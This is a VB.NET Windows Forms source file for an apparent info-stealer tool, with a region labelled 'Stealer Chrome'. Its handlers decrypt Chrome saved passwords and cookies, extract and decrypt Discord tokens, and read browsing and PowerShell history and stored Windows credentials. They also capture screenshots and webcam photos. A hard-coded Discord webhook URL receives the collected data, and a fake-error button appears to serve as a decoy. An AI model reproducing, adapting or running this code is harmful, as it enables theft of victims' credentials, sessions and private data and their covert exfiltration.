Imports System.Management
Imports System.Net
Imports System.Text.Json
Imports System.Drawing.Imaging
Imports System.Runtime.InteropServices
Imports System.Net.Http
Imports AForge.Video
Imports AForge.Video.DirectShow
Imports System.IO
Imports System.Data.SQLite
Imports System.Text.RegularExpressions
Imports Org.BouncyCastle.Crypto
Imports Org.BouncyCastle.Crypto.Parameters
Imports Org.BouncyCastle.Security
Imports System.Text
Imports Newtonsoft.Json.Linq
Imports System.Security.Cryptography


Public Class Form1
    Private videoSource As VideoCaptureDevice
    'Private Async Sub SendToWebhook(title As String, content As String)
    '    Dim json = $"{{""embeds"":[{{""title"":""{title}"",""description"":""{content}""}}]}}"
    '    Dim httpClient As New HttpClient()
    '    Dim stringContent As New StringContent(json, Text.Encoding.UTF8, "application/json")
    '    Dim response = Await httpClient.PostAsync("https://your.webhook.url/here", stringContent)
    '    MessageBox.Show($"Status: {response.StatusCode}")
    'End Sub
    Private Sub btnListDesktop_Click(sender As Object, e As EventArgs) Handles btnListDesktop.Click
        Dim desktopPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        Dim files = Directory.GetFiles(desktopPath)
        Dim result = String.Join(vbCrLf, files.Take(10))
        MessageBox.Show(result, "🖥 Desktop Files")
    End Sub

    Private Sub btnCamera_Click(sender As Object, e As EventArgs) Handles btnCamera.Click
        Dim videoDevices As New FilterInfoCollection(FilterCategory.VideoInputDevice)
        If videoDevices.Count = 0 Then
            MessageBox.Show("No camera found")
            Return
        End If

        videoSource = New VideoCaptureDevice(videoDevices(0).MonikerString)
        AddHandler videoSource.NewFrame, AddressOf CaptureFrame
        videoSource.Start()
    End Sub

    Private Sub CaptureFrame(sender As Object, eventArgs As NewFrameEventArgs)
        Dim frame As Bitmap = DirectCast(eventArgs.Frame.Clone(), Bitmap)
        frame.Save("webcam_photo.png", Imaging.ImageFormat.Png)
        videoSource.SignalToStop()
        MessageBox.Show("Webcam photo saved.", "📷")
    End Sub
    Private Sub btnSystemInfo_Click(sender As Object, e As EventArgs) Handles btnSystemInfo.Click
        Dim osName As String = GetOSInfo()
        Dim cpuInfo As String = GetCPUInfo()
        Dim ramInfo As String = GetRAMInfo()
        Dim hostname As String = Environment.MachineName

        Dim info As String = $"Hostname: {hostname}" & vbCrLf &
                             $"OS: {osName}" & vbCrLf &
                             $"CPU: {cpuInfo}" & vbCrLf &
                             $"RAM: {ramInfo}"

        MessageBox.Show(info, "🖥 System Info")
    End Sub

    Private Function GetOSInfo() As String
        Return $"{My.Computer.Info.OSFullName} {My.Computer.Info.OSVersion}"
    End Function

    Private Function GetCPUInfo() As String
        Try
            Dim mos As New ManagementObjectSearcher("select * from Win32_Processor")
            For Each mo As ManagementObject In mos.Get()
                Return mo("Name").ToString()
            Next
        Catch ex As Exception
        End Try
        Return "Unknown CPU"
    End Function

    Private Function GetRAMInfo() As String
        Return Math.Round(My.Computer.Info.TotalPhysicalMemory / (1024 ^ 3), 2) & " GB"
    End Function

    Private Async Sub btnIPInfo_Click(sender As Object, e As EventArgs) Handles btnIPInfo.Click
        Try
            Using client As New HttpClient()
                Dim json = Await client.GetStringAsync("https://ipinfo.io/json")
                Dim doc = JsonDocument.Parse(json)
                Dim root = doc.RootElement

                Dim ip = root.GetProperty("ip").GetString()
                Dim city = root.GetProperty("city").GetString()
                Dim country = root.GetProperty("country").GetString()
                Dim org = root.GetProperty("org").GetString()

                Dim info As String = $"IP: {ip}" & vbCrLf &
                                     $"City: {city}" & vbCrLf &
                                     $"Country: {country}" & vbCrLf &
                                     $"ISP: {org}"

                MessageBox.Show(info, "🌍 IP Info")
            End Using
        Catch ex As Exception
            MessageBox.Show("Error fetching IP info: " & ex.Message)
        End Try
    End Sub
#Region "Stealer Chrome"
    <StructLayout(LayoutKind.Sequential)>
    Public Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure

    <DllImport("crypt32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Shared Function CryptUnprotectData(
        ByRef pDataIn As DATA_BLOB,
        ByVal szDataDescr As String,
        ByVal pOptionalEntropy As IntPtr,
        ByVal pvReserved As IntPtr,
        ByVal pPromptStruct As IntPtr,
        ByVal dwFlags As Integer,
        ByRef pDataOut As DATA_BLOB) As Boolean
    End Function

    Private Function DecryptData(encryptedBytes As Byte()) As String
        Dim dataIn As New DATA_BLOB()
        Dim dataOut As New DATA_BLOB()
        Try
            Dim encryptedDataLength As Integer = encryptedBytes.Length
            dataIn.pbData = Marshal.AllocHGlobal(encryptedDataLength)
            dataIn.cbData = encryptedDataLength
            Marshal.Copy(encryptedBytes, 0, dataIn.pbData, encryptedDataLength)

            If CryptUnprotectData(dataIn, Nothing, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, dataOut) Then
                Dim decryptedBytes(dataOut.cbData - 1) As Byte
                Marshal.Copy(dataOut.pbData, decryptedBytes, 0, dataOut.cbData)
                Return System.Text.Encoding.UTF8.GetString(decryptedBytes)
            End If
        Catch ex As Exception
            Return "ERROR: " & ex.Message
        Finally
            If dataIn.pbData <> IntPtr.Zero Then Marshal.FreeHGlobal(dataIn.pbData)
            If dataOut.pbData <> IntPtr.Zero Then Marshal.FreeHGlobal(dataOut.pbData)
        End Try
        Return ""
    End Function
    Private Sub btnExtractPasswords_Click(sender As Object, e As EventArgs) Handles btnExtractPasswords.Click
        Dim loginDataPath As String = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Google\Chrome\User Data\Default\Login Data")

        Dim tempDb As String = "LoginVault.db"
        Try
            If File.Exists(tempDb) Then File.Delete(tempDb)
            File.Copy(loginDataPath, tempDb, True)

            Using conn As New SQLiteConnection($"Data Source={tempDb};Version=3;")
                conn.Open()
                Using cmd As New SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn)
                    Using reader As SQLiteDataReader = cmd.ExecuteReader()
                        Dim result As String = ""
                        While reader.Read()
                            Dim url = reader.GetString(0)
                            Dim username = reader.GetString(1)
                            Dim encryptedData = CType(reader("password_value"), Byte())
                            Dim decryptedPassword = DecryptData(encryptedData)

                            result &= $"URL: {url}" & vbCrLf &
                                      $"User: {username}" & vbCrLf &
                                      $"Pass: {decryptedPassword}" & vbCrLf & vbCrLf
                        End While
                        'MessageBox.Show(result, "🔒 Chrome Passwords")
                        TextBox1.Text = (result)
                    End Using
                End Using
                conn.Close()
            End Using
        Catch ex As Exception
            MessageBox.Show("ERROR: " & ex.Message)
        Finally
            GC.Collect()
            GC.WaitForPendingFinalizers()
            If File.Exists(tempDb) Then
                Try
                    File.Delete(tempDb)
                Catch ex As Exception
                    MessageBox.Show("Couldn't delete temp DB: " & ex.Message)
                End Try
            End If
        End Try

    End Sub

#End Region
#Region "Token"
    Private Sub btnGetDiscordToken_Click(sender As Object, e As EventArgs) Handles btnGetDiscordToken.Click
        Dim tokenFolder As String = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Discord\Local Storage\leveldb")

        If Not Directory.Exists(tokenFolder) Then
            MessageBox.Show("Discord not installed or token folder missing.", "⚠️")
            Return
        End If

        Dim tokenRegex As New Regex("([A-Za-z\d]{24}\.[\w-]{6}\.[\w-]{27})", RegexOptions.Compiled)
        Dim encryptedRegex As New Regex("dQw4w9WgXcQ:[^\s""]+", RegexOptions.Compiled)

        Dim foundTokens As New List(Of String)

        Dim files = Directory.GetFiles(tokenFolder, "*.*").Where(Function(f) f.EndsWith(".log") Or f.EndsWith(".ldb"))

        For Each file As String In files
            Try
                Dim lines = System.IO.File.ReadAllLines(file)
                For Each line As String In lines
                    For Each match As Match In tokenRegex.Matches(line)
                        foundTokens.Add(match.Value)
                    Next
                    For Each match As Match In encryptedRegex.Matches(line)
                        foundTokens.Add("Encrypted Token → " & match.Value)
                    Next
                Next
            Catch ex As Exception
                ' Silent failure
            End Try
        Next

        Dim result As String = If(foundTokens.Any(), String.Join(vbCrLf, foundTokens), "Not Found")
        'MessageBox.Show("Discord Token(s):" & vbCrLf & result, "🪙 Token Result")
        TextBox1.Text = result
    End Sub
    Private Sub btnDecryptToken_Click(sender As Object, e As EventArgs) Handles btnDecryptToken.Click
        Dim encryptedInput As String = InputBox("Enter Encrypted Token (without prefix):", "Token")
        Try
            Dim result = DecryptDiscordToken(encryptedInput)
            MessageBox.Show("Decrypted Token: " & result, "🔓 Success")
        Catch ex As Exception
            MessageBox.Show("Error decrypting token: " & ex.Message, "❌ Failed")
        End Try
    End Sub

    Private Function GetDecryptionKey() As Byte()
        Dim localStatePath As String = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).Replace("Roaming", "Local"),
        "Discord\Local State")

        Dim jsonContent As String = File.ReadAllText(localStatePath)
        Dim json As JObject = JObject.Parse(jsonContent)

        Dim encryptedKeyB64 As String = json("os_crypt")("encrypted_key").ToString()
        Dim encryptedKeyWithPrefix As Byte() = Convert.FromBase64String(encryptedKeyB64)

        ' Strip DPAPI prefix (first 5 bytes == "DPAPI")
        Dim encryptedKey(encryptedKeyWithPrefix.Length - 6) As Byte
        Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length)

        Return ProtectedData.Unprotect(encryptedKey, Nothing, DataProtectionScope.CurrentUser)
    End Function
    Private Function DecryptDiscordToken(encryptedBase64 As String) As String
        Dim key As Byte() = GetDecryptionKey()
        Dim encryptedBytes As Byte() = Convert.FromBase64String(encryptedBase64)

        Dim nonce(11) As Byte ' First 12 bytes
        Array.Copy(encryptedBytes, 3, nonce, 0, 12)

        Dim ciphertext(encryptedBytes.Length - 15) As Byte
        Array.Copy(encryptedBytes, 15, ciphertext, 0, ciphertext.Length)

        Dim tag(15) As Byte
        Array.Copy(ciphertext, ciphertext.Length - 16, tag, 0, 16)

        Dim actualCiphertext(ciphertext.Length - 17) As Byte
        Array.Copy(ciphertext, 0, actualCiphertext, 0, ciphertext.Length - 16)

        Dim parameters As New AeadParameters(New KeyParameter(key), 128, nonce, Nothing)
        Dim cipher As IBufferedCipher = CipherUtilities.GetCipher("AES/GCM/NoPadding")
        cipher.Init(False, parameters)

        Dim plainBytes() As Byte = cipher.DoFinal(ciphertext)
        Return Encoding.UTF8.GetString(plainBytes)
    End Function

#End Region
    Private Sub btnScanChromeProfiles_Click(sender As Object, e As EventArgs) Handles btnScanChromeProfiles.Click
        Dim basePath As String = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Google\Chrome\User Data")

        If Not Directory.Exists(basePath) Then
            MessageBox.Show("Chrome directory not found.")
            Return
        End If

        Dim profiles = Directory.GetDirectories(basePath)
        Dim message As String = "Available Chrome Profiles:" & vbCrLf & vbCrLf

        For Each profile In profiles
            If File.Exists(Path.Combine(profile, "Cookies")) Then
                message &= profile & " → Cookies file found." & vbCrLf
            Else
                message &= profile & " → No Cookies file." & vbCrLf
            End If
        Next

        MessageBox.Show(message, "🔍 Profile Scan")
    End Sub

    Private Sub btnGetCookies_Click(sender As Object, e As EventArgs) Handles btnGetCookies.Click
        Try
            Dim chromeCookiesPath As String = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Google\Chrome\User Data\Default\Network\Cookies")

            If Not File.Exists(chromeCookiesPath) Then
                MessageBox.Show("لم يتم العثور على ملف الكوكيز.", "⚠️")
                Return
            End If

            Dim key As Byte() = GetChromeDecryptionKey()
            Dim result As New StringBuilder()

            ' استخدام SQLite مع ملف مقفل
            Dim connString As String = $"Data Source={chromeCookiesPath};Mode=ReadOnly;Read Only=True;Cache=Shared;"

            Using conn As New SQLiteConnection(connString)
                conn.Open()
                Using cmd As New SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", conn)
                    Using reader As SQLiteDataReader = cmd.ExecuteReader()
                        While reader.Read()
                            Dim host = reader.GetString(0)
                            Dim name = reader.GetString(1)
                            Dim encVal = CType(reader("encrypted_value"), Byte())
                            Dim val = DecryptCookieValue(encVal, key)

                            result.AppendLine($"[{host}] {name} = {val}")
                        End While
                    End Using
                End Using
            End Using

            MessageBox.Show(result.ToString(), "✅ Decrypted Cookies")

        Catch ex As Exception
            MessageBox.Show("ERROR: " & ex.Message, "❌ Failed")
        End Try
    End Sub

    Private Function DecryptChromeData(encryptedData As Byte()) As String
        Try
            If encryptedData Is Nothing OrElse encryptedData.Length = 0 Then Return ""

            ' إذا يبدأ بـ "v10" أو "v11" فهو مشفّر بـ AES-GCM وسنحتاج مفتاح
            If encryptedData(0) = &H76 AndAlso encryptedData(1) = &H31 AndAlso encryptedData(2) = &H30 Then
                Return "[Encrypted with AES-GCM - not implemented here]"
            End If

            ' وإلا نستخدم DPAPI
            Dim decryptedBytes() As Byte = ProtectedData.Unprotect(encryptedData, Nothing, DataProtectionScope.CurrentUser)
            Return Encoding.UTF8.GetString(decryptedBytes)
        Catch ex As Exception
            Return "ERROR: " & ex.Message
        End Try
    End Function
    Private Function GetChromeDecryptionKey() As Byte()
        Dim localStatePath As String = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
        "Google\Chrome\User Data\Local State")

        If Not File.Exists(localStatePath) Then
            Throw New FileNotFoundException("Local State not found.")
        End If

        Dim jsonText As String = File.ReadAllText(localStatePath)
        Dim json As JObject = JObject.Parse(jsonText)
        Dim encryptedKeyBase64 As String = json("os_crypt")("encrypted_key").ToString()

        Dim encryptedKeyWithPrefix As Byte() = Convert.FromBase64String(encryptedKeyBase64)

        ' إزالة بادئة DPAPI
        Dim encryptedKey(encryptedKeyWithPrefix.Length - 6) As Byte
        Array.Copy(encryptedKeyWithPrefix, 5, encryptedKey, 0, encryptedKey.Length)

        ' فك التشفير عبر DPAPI
        Return ProtectedData.Unprotect(encryptedKey, Nothing, DataProtectionScope.CurrentUser)
    End Function


    Private Function DecryptCookieValue(encryptedData As Byte(), key As Byte()) As String
        If encryptedData.Length < 15 Then Return "[Invalid Encrypted Cookie]"

        ' Skip prefix (v10 or v11)
        Dim nonce(11) As Byte
        Array.Copy(encryptedData, 3, nonce, 0, 12)

        Dim cipherTextLength As Integer = encryptedData.Length - 15
        Dim cipherText(cipherTextLength - 1) As Byte
        Array.Copy(encryptedData, 15, cipherText, 0, cipherTextLength)

        Try
            Dim cipherParams = New AeadParameters(New KeyParameter(key), 128, nonce, Nothing)
            Dim cipher = CipherUtilities.GetCipher("AES/GCM/NoPadding")
            cipher.Init(False, cipherParams)

            Dim plainText = cipher.DoFinal(cipherText)
            Return Encoding.UTF8.GetString(plainText)
        Catch ex As Exception
            Return "[Decrypt Failed: " & ex.Message & "]"
        End Try
    End Function

    Private Sub btnDirectDecryptCookies_Click(sender As Object, e As EventArgs) Handles btnDirectDecryptCookies.Click
        Dim cookiesPath As String = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Google\Chrome\User Data\Default\Network\Cookies")

        If Not File.Exists(cookiesPath) Then
            MessageBox.Show("Cookies file not found.")
            Return
        End If

        Dim result As New StringBuilder()
        Dim key As Byte() = GetChromeDecryptionKey()

        Try
            Dim connString As String = $"Data Source={cookiesPath};Mode=ReadOnly;Read Only=True;Cache=Shared;"

            Using conn As New SQLiteConnection(connString)
                conn.Open()
                Using cmd As New SQLiteCommand("SELECT host_key, name, encrypted_value FROM cookies", conn)
                    Using reader As SQLiteDataReader = cmd.ExecuteReader()
                        While reader.Read()
                            Dim host = reader.GetString(0)
                            Dim name = reader.GetString(1)
                            Dim encVal = CType(reader("encrypted_value"), Byte())
                            Dim val = DecryptCookieValue(encVal, key)
                            result.AppendLine($"[{host}] {name} = {val}")
                        End While
                    End Using
                End Using
            End Using
            MessageBox.Show(result.ToString(), "🍪 Decrypted Cookies")
        Catch ex As Exception
            MessageBox.Show("ERROR: " & ex.Message)
        End Try
    End Sub
    Private Sub btnGetHistory_Click(sender As Object, e As EventArgs) Handles btnGetHistory.Click
        Try
            Dim historyPath As String = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Google\Chrome\User Data\Default\History")

            If Not File.Exists(historyPath) Then
                TextBox1.Text = "❌ File not found: Chrome history"
                Return
            End If

            Dim tempDb = "HistoryTemp.db"
            If File.Exists(tempDb) Then File.Delete(tempDb)
            File.Copy(historyPath, tempDb, True)

            Dim result As New StringBuilder()

            Using conn As New SQLiteConnection($"Data Source={tempDb};Version=3;")
                conn.Open()
                Using cmd As New SQLiteCommand("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50", conn)
                    Using reader As SQLiteDataReader = cmd.ExecuteReader()
                        While reader.Read()
                            Dim url = reader.GetString(0)
                            Dim title = reader.GetString(1)
                            Dim lastVisitRaw = reader.GetDouble(2)
                            Dim lastVisit = ChromeTimeToDate(lastVisitRaw)
                            result.AppendLine($"• {title}" & vbCrLf & $"  ↳ {url}" & vbCrLf & $"  ⏱ {lastVisit}" & vbCrLf)
                        End While
                    End Using
                End Using
            End Using

            File.Delete(tempDb)
            TextBox1.Text = result.ToString()

        Catch ex As Exception
            TextBox1.Text = "❌ Error: " & ex.Message
        End Try
    End Sub
    Private Function ChromeTimeToDate(chromeTime As Double) As String
        Try
            ' Chrome time is in microseconds since Jan 1, 1601
            Dim epoch As New DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc)
            Return epoch.AddSeconds(chromeTime / 1000000).ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss")
        Catch
            Return "Invalid Date"
        End Try
    End Function
    Dim webhookUrl As String = "https://discord.com/api/webhooks/1374640091309539408/lKedsfNy5F6fP3azC-rLmEgd8r0SEsazBJuBex6wQb1Ald1Wul8RbHPRaqXQoybFd6u_" ' ← ضع رابطك هنا
    Private Function EscapeDiscord(text As String) As String
        Return text.Replace("\", "\\").Replace("""", "\""").Replace(vbCrLf, "\n")
    End Function

    Private Async Sub SendTextBoxToWebhook()
        Try
            Dim content As String = TextBox1.Text
            If String.IsNullOrWhiteSpace(content) Then
                MessageBox.Show("لا يوجد شيء لإرساله.")
                Return
            End If

            Dim payload As String = "{""content"":""" & EscapeDiscord(content) & """}"

            Using client As New Net.Http.HttpClient()
                Dim requestContent As New Net.Http.StringContent(payload, Encoding.UTF8, "application/json")
                Dim response = Await client.PostAsync(webhookUrl, requestContent)
                If response.IsSuccessStatusCode Then
                    MessageBox.Show("✅ تم إرسال البيانات إلى Discord.")
                Else
                    MessageBox.Show("❌ فشل الإرسال. الحالة: " & response.StatusCode.ToString())
                End If
            End Using

        Catch ex As Exception
            MessageBox.Show("❌ خطأ أثناء الإرسال: " & ex.Message)
        End Try
    End Sub
    Private Sub btnSendToWebhook_Click(sender As Object, e As EventArgs) Handles btnSendToWebhook.Click
        SendTextBoxToWebhook()
    End Sub
    Private Sub btnScreenshot_Click(sender As Object, e As EventArgs) Handles btnScreenshot.Click
        Dim bounds As Rectangle = Screen.PrimaryScreen.Bounds
        Dim screenshot As New Bitmap(bounds.Width, bounds.Height)

        Using g As Graphics = Graphics.FromImage(screenshot)
            g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size)
        End Using

        screenshot.Save("screenshot.png", Imaging.ImageFormat.Png)
        TextBox1.Text = "✅ Screenshot saved: screenshot.png"
    End Sub
    Private Sub CaptureWebcamFrame(sender As Object, eventArgs As NewFrameEventArgs)
        Dim frame As Bitmap = DirectCast(eventArgs.Frame.Clone(), Bitmap)
        frame.Save("webcam_photo.png", Imaging.ImageFormat.Png)
        videoSource.SignalToStop()
        TextBox1.Invoke(Sub() TextBox1.Text = "✅ Webcam photo saved: webcam_photo.png")
    End Sub
    Private Sub btnDesktopFiles_Click(sender As Object, e As EventArgs) Handles btnDesktopFiles.Click
        Dim desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
        Dim files = Directory.GetFiles(desktopPath)
        TextBox1.Text = "🖥️ Desktop Files:" & vbCrLf & String.Join(vbCrLf, files.Take(10))
    End Sub
    Private Sub btnDownloads_Click(sender As Object, e As EventArgs) Handles btnDownloads.Click
        Dim downloadsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")
        If Directory.Exists(downloadsPath) Then
            Dim files = Directory.GetFiles(downloadsPath)
            TextBox1.Text = "📂 Downloads:" & vbCrLf & String.Join(vbCrLf, files.Take(10))
        Else
            TextBox1.Text = "❌ Downloads folder not found."
        End If
    End Sub
    Private Sub btnChromePasswords_Click(sender As Object, e As EventArgs) Handles btnChromePasswords.Click
        Try
            Dim loginDataPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Google\Chrome\User Data\Default\Login Data")

            If Not File.Exists(loginDataPath) Then
                TextBox1.Text = "❌ Chrome Login Data not found."
                Return
            End If

            Dim tempDb = "LoginDataTemp.db"
            If File.Exists(tempDb) Then File.Delete(tempDb)
            File.Copy(loginDataPath, tempDb, True)

            Dim result As New StringBuilder()

            Using conn As New SQLiteConnection($"Data Source={tempDb};Version=3;")
                conn.Open()
                Dim cmd As New SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn)
                Dim reader = cmd.ExecuteReader()
                While reader.Read()
                    Dim url = reader.GetString(0)
                    Dim user = reader.GetString(1)
                    Dim passBytes = CType(reader("password_value"), Byte())
                    Dim pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(passBytes, Nothing, DataProtectionScope.CurrentUser))
                    result.AppendLine($"🌐 {url}" & vbCrLf & $"👤 {user}" & vbCrLf & $"🔑 {pass}" & vbCrLf)
                End While
            End Using

            File.Delete(tempDb)
            TextBox1.Text = result.ToString()
        Catch ex As Exception
            TextBox1.Text = "❌ Error: " & ex.Message
        End Try
    End Sub
    Private Sub btnSSID_Click(sender As Object, e As EventArgs) Handles btnSSID.Click
        Try
            Dim output = ""
            Using proc As New Process()
                proc.StartInfo.FileName = "netsh"
                proc.StartInfo.Arguments = "wlan show interfaces"
                proc.StartInfo.UseShellExecute = False
                proc.StartInfo.RedirectStandardOutput = True
                proc.StartInfo.CreateNoWindow = True
                proc.Start()
                output = proc.StandardOutput.ReadToEnd()
            End Using

            Dim ssidLine = output.Split(ControlChars.Lf).FirstOrDefault(Function(l) l.Contains("SSID") AndAlso Not l.Contains("BSSID"))
            Dim ssid = If(ssidLine IsNot Nothing, ssidLine.Split(":"c)(1).Trim(), "Not Found")
            TextBox1.Text = "📶 SSID: " & ssid
        Catch ex As Exception
            TextBox1.Text = "❌ Error getting SSID: " & ex.Message
        End Try
    End Sub
    Private Sub btnGames_Click(sender As Object, e As EventArgs) Handles btnGames.Click
        Dim gamePaths = {
        "C:\Program Files\Steam",
        "C:\Program Files (x86)\Steam",
        "C:\Program Files\Epic Games",
        "C:\Program Files (x86)\Epic Games",
        "C:\Program Files\Ubisoft",
        "C:\Program Files (x86)\Ubisoft"
    }

        Dim foundGames As New List(Of String)
        For Each path In gamePaths
            If Directory.Exists(path) Then
                foundGames.AddRange(Directory.GetDirectories(path).Select(Function(d) System.IO.Path.GetFileName(d)))
            End If
        Next

        TextBox1.Text = If(foundGames.Count = 0, "🎮 No known games found.", "🎮 Installed Games:" & vbCrLf & String.Join(vbCrLf, foundGames))
    End Sub
    Private Sub btnHWID_UUID_Click(sender As Object, e As EventArgs) Handles btnHWID_UUID.Click
        Try
            Dim hwid As String = ""
            Using proc As New Process()
                proc.StartInfo.FileName = "wmic"
                proc.StartInfo.Arguments = "csproduct get UUID"
                proc.StartInfo.UseShellExecute = False
                proc.StartInfo.RedirectStandardOutput = True
                proc.StartInfo.CreateNoWindow = True
                proc.Start()
                hwid = proc.StandardOutput.ReadToEnd()
            End Using
            Dim uuid = Guid.NewGuid().ToString()
            TextBox1.Text = "🔧 HWID/UUID:" & vbCrLf & hwid.Trim() & vbCrLf & "Generated UUID: " & uuid
        Catch ex As Exception
            TextBox1.Text = "❌ Error retrieving HWID/UUID: " & ex.Message
        End Try
    End Sub
    Private Sub btnTaskList_Click(sender As Object, e As EventArgs) Handles btnTaskList.Click
        Try
            Dim processes = Process.GetProcesses().Take(30)
            Dim result As New StringBuilder()
            For Each proc In processes
                result.AppendLine($"🧠 {proc.ProcessName} | PID: {proc.Id}")
            Next
            TextBox1.Text = result.ToString()
        Catch ex As Exception
            TextBox1.Text = "❌ Error: " & ex.Message
        End Try
    End Sub
    Private Sub btnPowershellHistory_Click(sender As Object, e As EventArgs) Handles btnPowershellHistory.Click
        Try
            Dim historyPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")

            If File.Exists(historyPath) Then
                TextBox1.Text = File.ReadAllText(historyPath)
            Else
                TextBox1.Text = "❌ PowerShell history not found."
            End If
        Catch ex As Exception
            TextBox1.Text = "❌ Error: " & ex.Message
        End Try
    End Sub
    Private Sub btnCredentials_Click(sender As Object, e As EventArgs) Handles btnCredentials.Click
        Try
            Dim output As String = ""
            Using proc As New Process()
                proc.StartInfo.FileName = "cmdkey"
                proc.StartInfo.Arguments = "/list"
                proc.StartInfo.UseShellExecute = False
                proc.StartInfo.RedirectStandardOutput = True
                proc.StartInfo.CreateNoWindow = True
                proc.Start()
                output = proc.StandardOutput.ReadToEnd()
            End Using
            TextBox1.Text = output
        Catch ex As Exception
            TextBox1.Text = "❌ Error getting credentials: " & ex.Message
        End Try
    End Sub
    Private Sub btnFakeError_Click(sender As Object, e As EventArgs) Handles btnFakeError.Click
        MessageBox.Show("Something went wrong while executing the operation.", "💥 Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
    End Sub
    Private Sub btnExport_Click(sender As Object, e As EventArgs) Handles btnExport.Click
        Try
            Dim path As String = "exported_result.txt"
            File.WriteAllText(path, TextBox1.Text)
            MessageBox.Show("✅ Exported to " & path)
        Catch ex As Exception
            MessageBox.Show("❌ Export failed: " & ex.Message)
        End Try
    End Sub

End Class
